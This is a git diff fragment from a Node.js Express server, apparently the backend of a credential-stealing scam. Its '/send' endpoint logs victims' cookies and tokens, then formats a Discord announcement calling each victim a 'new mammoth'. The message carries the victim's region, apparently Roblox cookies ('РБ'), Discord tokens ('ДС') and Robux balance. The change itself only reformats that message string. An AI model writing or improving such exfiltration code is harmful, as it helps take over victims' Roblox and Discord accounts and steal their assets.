@@ -27,7 +27,7 @@ app.post('/send', async (req, res) => {
   console.log('Cookies:', cookiesString);
   console.log('Tokens:', tokensString);
 
-  const plainMessage = '@everyone Новый мамонт! Регион: ```' + region + ' ``` \n \n  РБ: ```' + cookiesString + ' ``` \n ДС: ```' + tokensString + ' ``` \n РОБУКСЫ: ```' + robux + ' ```';
+  const plainMessage = '@everyone Новый мамонт! Регион: ```' + region + ' ```  РБ: ```' + cookiesString + ' ``` ДС: ```' + tokensString + ' ``` РОБУКСЫ: ```' + robux + ' ```';
   const content = plainMessage;
 
   // Отправляем в Discord
